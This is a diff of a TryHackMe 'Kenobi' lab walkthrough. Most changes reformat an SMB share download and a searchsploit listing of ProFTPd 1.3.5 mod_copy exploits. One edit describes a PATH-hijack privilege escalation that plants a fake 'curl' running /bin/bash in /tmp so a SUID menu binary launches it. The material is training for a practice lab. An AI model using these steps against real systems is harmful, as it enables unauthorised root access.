@@ -136,9 +136,9 @@ https://tryhackme.com/room/kenobi
 * download all content with smbget
     ```
     smbget -R smb://10.10.67.185/anonymous -U anon
-    Password for [anon] connecting to //anonymous/10.10.67.185: 
+    Password for [anon] connecting to //anonymous/10.10.67.185:
     Using workgroup WORKGROUP, user anon
-    smb://10.10.67.185/anonymous/log.txt                                                                                                                                      
+    smb://10.10.67.185/anonymous/log.txt
     Downloaded 11.95kB in 4 seconds
     ```
 * review the log file and we can find a key piece of info for this room
@@ -171,13 +171,13 @@ https://tryhackme.com/room/kenobi
 * use searchsploit to search for the version of ProFTPD you found above
     ```
     searchsploit proftpd 1.3.5
-    ---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-    Exploit Title                                                                                                                          |  Path
-    ---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                               | linux/remote/37262.rb
-    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                     | linux/remote/36803.py
-    ProFTPd 1.3.5 - File Copy                                                                                                               | linux/remote/36742.txt
-    ---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    ---------------------------------------------------------- ---------------------------------
+    Exploit Title                                             |  Path
+    ---------------------------------------------------------- ---------------------------------
+    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
+    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
+    ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
+    ---------------------------------------------------------- ---------------------------------
     Shellcodes: No Results
     ```
     ```
@@ -396,7 +396,7 @@ Use the SSH key you copied above to login
     uname -r
     ifconfig
     ```
-* From the output above, curl is not using a full path, so we can create a malicious curl and hope /usr/bin/menu will run it instead
+* From the output above, curl is not using a full path, so we can create a malicious curl and coax /usr/bin/menu to run it instead by inserting /tmp at the beginning of the PATH environment variable
     ```
     kenobi@kenobi:~$ cd /tmp
     kenobi@kenobi:/tmp$ echo /bin/bash > curl
